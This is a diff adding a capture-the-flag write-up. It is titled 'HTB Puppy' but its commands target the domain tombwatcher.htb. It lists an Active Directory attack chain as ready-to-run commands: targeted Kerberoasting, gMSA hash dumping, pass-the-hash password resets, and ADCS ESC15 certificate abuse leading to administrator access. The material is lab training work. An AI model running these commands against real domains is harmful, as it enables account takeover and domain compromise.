@@ -1,2 +1,120 @@
+HTB Puppy
+---------------------------------------
+Credential Given:
+username: henry
+password: H3nry_987TGV!
+--------------------------------------
+1. Scanning & Enumeration
+nmap -sCV -T4 10.10.11.72 -v -oN nmap.txt
+
+
+---------------------------------------
+Bloodhound Enumeration
+---------------------------------------
+
+1) henry 
+henry Outbound object control
+- has WriteSPN over alfred (can perform targeted kerberoasting)
+
+2) alfred
+alfred Outbound object control
+- has AddSelf to INFRASTRUCTURE group (can add himself to the group)
+
+3) infrastructure
+infrastructure group Outbound object control
+- has ReadGMSAPassword over ansible_dev$
+
+4) ansible_dev$
+ansible_dev$ Outbound object control
+- has ForceChangePassword over sam
+
+5) sam
+sam Outbound object control
+- has WriteOwner over john
+
+6) john
+john Group Membership
+- REMOTE MANAGEMENT USERS (can winrm into machine)
+- DOMAIN USERS
+
+john Outbound object control
+- has GenericAll over ADCS OU
+
+2. Exploitation
+
+2.1 alfred (Targeted Kerberoasting)
+- python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
+
+Output:
+- cracked password: basketball
+
+2.2 Add alfred into infrastructure group
+- bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "alfred"
+
+Verify group membership:
+- net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb"/"alfred"%"basketball" -S "tombwatcher.htb"
+
+2.3 Read GMSA Password of ansible_dev$
+- python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb' -l 10.10.11.72
+
+Output:
+- ansible_dev$ NT hash: 1c37d00093dc2a5f25176bf2d474afdc
+
+2.4 Force change password user sam
+- pth-net rpc password "sam" "s@mN3wP@ssw0rd" -U "tombwatcher.htb"/"ansible_dev$"%"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA":"1c37d00093dc2a5f25176bf2d474afdc" -S "tombwatcher.htb"
+
+2.5 Change password user john
+- net rpc password "john" "j0hnN3wPassw0rd" -U "tombwatcher.htb"/"sam"%"s@mN3wP@ssw0rd" -S "tombwatcher.htb"
+
+3. User Flag
+3.1 WinRM into the machine as john
+- evil-winrm -u john -i 10.10.11.72
+
+Output: User flag obtained!
+
+4. Privilege Escalation
+
+4.1 Get FullControl over ADCS as john
+- impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'ADCS' 'tombwatcher'/'john':'j0hnN3wPassw0rd'
+
+4.2 Enumerate ADCS OU
+- $OU = "OU=ADCS,DC=tombwatcher,DC=htb"
+- Get-ADObject -SearchBase $OU -Filter * -SearchScope Subtree
+
+Output:
+DistinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb 
+Name: cert_admin 
+ObjectClass: user
+
+4.3 Change password user cert_admin
+- net rpc password "cert_admin" "c3rt@dm1n" -U "tombwatcher.htb"/"john"%"j0hnN3wPassw0rd" -S "tombwatcher.htb"
+
+4.4 ADCS Enumeration as cert_admin
+- certipy-ad find -u cert_admin -p c3rt@dm1n -dc-ip 10.10.11.72 -hide-admins -vulnerable
+
+Output:
+[!] Vulnerabilities
+  ESC15                             : Enrollee supplies subject and schema version is 1.
+[*] Remarks
+  ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+
+4.5 Exploit ESC15
+- certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'c3rt@dm1n' -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
+
+Output: administrator.pfx
+
+4.6 Gain access as administrator
+- certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
+
+4.7 Change administrator password
+- change_password administrator @dm1n1$tr@t0r_P@ssw0rd
+
+5 Root Flag
+5.1 WinRM into the machine as administrator with the changed password
+- evil-winrm -u administrator -i 10.10.11.72
+
+Output: Root flag obtained!!
+
+
 
 
